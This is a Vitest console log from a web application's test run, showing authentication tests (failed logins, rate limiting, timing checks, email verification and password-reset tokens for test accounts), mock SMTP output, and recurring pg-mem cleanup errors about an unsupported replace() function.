Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstdout[2m | tests/pages/public-pages.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39m[2m2026-03-02T14:58:22.205Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m User not found 
{ email: [32m'test-f2931216-a900-4cdf-830b-8ee3b87d32
92@test.local'[39m }

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrej├¿te 
timing attack (temps similaire)
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstderr[2m | tests/pages/public-pages.test.ts
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstdout[2m | tests/pages/public-pages.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/pages/public-pages.test.ts [2m([22m[2m62 tests[22m[2m)[22m[33m 603[2mms[22m[39m
[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mConnexion S├®curis├®e[2m > [22m[2mrate limit apr├¿s 5 ├®checs
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463502577-0.05882412072480525'[39m,
  to: [32m'test-213a32c8-3d57-4578-9b7a-634faab20eaa@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39m[2m2026-03-02T14:58:22.874Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstdout[2m | tests/i18n/routing.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39m[2m2026-03-02T14:58:23.255Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstderr[2m | tests/i18n/routing.test.ts
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstdout[2m | tests/i18n/routing.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/routing.test.ts [2m([22m[2m18 tests[22m[2m)[22m[33m 494[2mms[22m[39m
[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39m[2m2026-03-02T14:58:23.544Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39m[2m2026-03-02T14:58:23.850Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstdout[2m | tests/unit/loaders/factory.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39m[2m2026-03-02T14:58:24.223Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mConnexion S├®curis├®e[2m > [22m[2mrate 
limit apr├¿s 5 ├®checs
[22m[39mloginTestUser error: Error: Too many login 
attempts
    at Object.instance.api.signInEmail (C:/Users/Utili
sateur/Documents/concordia/src/lib/auth/auth.ts:384:26
)
    at loginTestUser (C:/Users/Utilisateur/Documents/c
oncordia/tests/utils/auth-test-utils.ts:156:35)
[90m    at processTicksAndRejections 
(node:internal/process/task_queues:95:5)[39m
    at C:/Users/Utilisateur/Documents/concordia/src/li
b/auth/auth.test.ts:165:7
    at [90mfile:///C:/Users/Utilisateur/Documents/con
cordia/[39mnode_modules/[4m.pnpm[24m/@vitest+runner
@4.0.18/node_modules/[4m@vitest[24m/runner/dist/inde
x.js:915:20 {
  status: [32m'TOO_MANY_REQUESTS'[39m
}

[90mstderr[2m | tests/unit/loaders/factory.test.ts
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstdout[2m | tests/unit/loaders/factory.test.ts[2m > [22m[2mcreateTranslationLoader (unit)[2m > [22m[2mlogs error on missing lang key in translation
[22m[39mTranslation object keys: [ [32m'headline'[39m, [32m'articleBody'[39m ]

[90mstdout[2m | tests/unit/loaders/factory.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/loaders/factory.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 468[2mms[22m[39m
[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mConnexion S├®curis├®e[2m > [22m[2msession unique par device
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463504613-0.6858924675165083'[39m,
  to: [32m'test-8808d820-b71b-41bc-9b05-3267dcdfd050@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/i18n/translation-coverage.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstderr[2m | 
tests/i18n/translation-coverage.test.ts
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstdout[2m | tests/i18n/translation-coverage.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/translation-coverage.test.ts [2m([22m[2m3 tests[22m[2m)[22m[33m 458[2mms[22m[39m
[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mEmail Verification[2m > [22m[2menvoie email avec token s├®curis├®
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463505603-0.9509957392377448'[39m,
  to: [32m'test-73d279a9-d3b2-4b9d-9cd7-4e4690298615@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/i18n/rtl.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mEmail Verification[2m > [22m[2mtoken verification ├á usage unique
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463505935-0.3512098476833114'[39m,
  to: [32m'test-c7bf62c3-1426-4ac4-9d61-66ccdbeefd53@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mEmail Verification[2m > [22m[2mtoken verification ├á usage unique
[22m[39mverification code eyJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6InRlc3QtYzdiZjYyYzMtMTQyNi00YWM0LTlkNjEtNjZjY2RiZWVmZDUzQHRlc3QubG9jYWwiLCJpYXQiOjE3NzI0NjM1MDUsImV4cCI6MTc3MjQ2NzEwNX0.pk4HRC4BCQu5NEARCVN83fLJBC7HRd1-aKnOdr7hdQY

[90mstderr[2m | tests/i18n/rtl.test.ts
[22m[39mCleanup error: QueryError: ERROR: function 
replace(text,text,text) does not exist
HINT: ƒö¿ Please note that pg-mem implements very few 
native functions.

            ƒæë You can specify the functions you 
would like to use via 
"db.public.registerFunction(...)"

ƒÉ£ This seems to be an execution error, which means 
that your request syntax seems okay,
    but the resulting statement cannot be executed 
ÔåÆ Probably not a pg-mem error.

*´©ÅÔâú Reconsituted failed SQL statement: UPDATE 
blog_organizations   SET slug = (lower ((replace 
(name, (' '), ('-')) )) )  WHERE (slug IS NULL)

ƒæë You can file an issue at 
https://github.com/oguimbal/pg-mem along with a way 
to reproduce this error (if you can), and  the 
stacktrace:


    at buildCall [90m(C:\Users\Utilisateur\Documents\
concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.
13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.j
s:8211:15[90m)[39m
    at Object.function [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:3497:46[90m)[39m
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1636:38[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m
    at [90mC:\Users\Utilisateur\Documents\concordia\
[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0.13_kysely@0
.28.11\node_modules\[4mpg-mem[24m\index.js:1635:36
    at Array.map (<anonymous>)
    at _buildCall [90m(C:\Users\Utilisateur\Documents
\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.0
.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index.
js:1635:27[90m)[39m
    at _buildValueReal [90m(C:\Users\Utilisateur\Docu
ments\concordia\[39mnode_modules\[4m.pnpm[24m\pg-me
m@3.0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\i
ndex.js:1544:20[90m)[39m
    at _buildValue [90m(C:\Users\Utilisateur\Document
s\concordia\[39mnode_modules\[4m.pnpm[24m\pg-mem@3.
0.13_kysely@0.28.11\node_modules\[4mpg-mem[24m\index
.js:1488:11[90m)[39m {
  data: {
    error: [32m'function replace(text,text,text) 
does not exist'[39m,
    hint: [32m'ƒö¿ Please note that pg-mem 
implements very few native functions.\n'[39m +
      [32m'\n'[39m +
      [32m'            ƒæë You can specify the 
functions you would like to use via 
"db.public.registerFunction(...)"'[39m
  },
  code: [90mundefined[39m,
  location: { start: [33m0[39m, end: [33m0[39m },
  [[32mSymbol(errorDetailsIncluded)[39m]: 
[33mtrue[39m
}

[90mstdout[2m | tests/i18n/rtl.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/i18n/rtl.test.ts [2m([22m[2m6 tests[22m[2m)[22m[33m 619[2mms[22m[39m
[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Reset[2m > [22m[2mtoken reset expire
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506650-0.6254754855064528'[39m,
  to: [32m'test-a2e6d05b-86d3-4a28-8cde-35c59d2742c2@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Reset[2m > [22m[2mtoken reset expire
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506662-0.9415570997006006'[39m,
  to: [32m'test-a2e6d05b-86d3-4a28-8cde-35c59d2742c2@test.local'[39m,
  subject: [32m'Password reset - R├®initialisation de votre mot de passe'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Reset[2m > [22m[2mtoken reset expire
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506668-0.673300312569157'[39m,
  to: [32m'test-a2e6d05b-86d3-4a28-8cde-35c59d2742c2@test.local'[39m,
  subject: [32m'Password reset - R├®initialisation de votre mot de passe'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Reset[2m > [22m[2mtoken reset expire
[22m[39mreset email html <p>Cliquez sur le lien suivant pour r├®initialiser votre mot de passe :</p><p><a href="http://localhost:3000/api/auth/reset-password/lMAI8FhqCQALGrk2JYyzC8jm?callbackURL=">http://localhost:3000/api/auth/reset-password/lMAI8FhqCQALGrk2JYyzC8jm?callbackURL=</a></p>
query match [1mnull[22m
path match [
  [32m'reset-password/lMAI8FhqCQALGrk2JYyzC8jm'[39m,
  [32m'lMAI8FhqCQALGrk2JYyzC8jm'[39m,
  index: [33m117[39m,
  input: [32m'<p>Cliquez sur le lien suivant pour r├®initialiser votre mot de passe :</p><p><a href="http://localhost:3000/api/auth/reset-password/lMAI8FhqCQALGrk2JYyzC8jm?callbackURL=">http://localhost:3000/api/auth/reset-password/lMAI8FhqCQALGrk2JYyzC8jm?callbackURL=</a></p>'[39m,
  groups: [90mundefined[39m
]
extracted token lMAI8FhqCQALGrk2JYyzC8jm

[90mstdout[2m | tests/unit/smtp.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send valid email
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send valid email
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463506910-0.5452356701706107'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test Email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with HTML
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

